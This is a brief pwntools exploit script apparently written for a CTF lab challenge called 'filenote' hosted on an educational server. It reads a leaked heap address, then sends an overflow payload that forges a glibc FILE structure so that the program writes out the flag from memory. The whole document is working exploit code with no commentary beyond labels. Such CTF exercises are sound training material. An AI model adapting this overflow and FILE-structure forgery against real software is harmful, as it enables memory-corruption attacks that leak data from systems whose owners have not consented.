from pwn import *

# Context Setting
context.terminal = ["tmux", "splitw", "-h", "-l", "105"]
context.arch = "amd64"
# context.log_level = "debug"

# GDB Debug Script
GDB_INIT = """
    b read_choice
"""

# r = process("./lab1_release/filenote_r/chal")
r = remote("edu-ctf.zoolab.org", 30215)

r.recvuntil(b"Here is a gift for you: 0x")
FLAG_FILE_ADDR = int(r.recvline().decode(), 16)

info("[LEAK]: Flag file structure heap addr: " + hex(FLAG_FILE_ADDR))

r.sendlineafter(b"> ", b"1")

# Sending Payload
r.sendlineafter(b"> ", b"2")

flags = 0xfbad0800
payload = b'A' * 0x200 + flat(
    0, 0x1e1,
    flags, 0,
    FLAG_FILE_ADDR - 4112, 0,
    FLAG_FILE_ADDR - 4112, FLAG_FILE_ADDR - 4112 + 0x40,
    0, 0, 0, 0, 0, 0, 0, 0, 1
)
r.sendlineafter(b"data> ", payload)

# gdb.attach(r, GDB_INIT)

r.sendlineafter(b"> ", b"3")

print(r.recv().decode().split('\n')[0])

r.sendlineafter(b"> ", b"22")
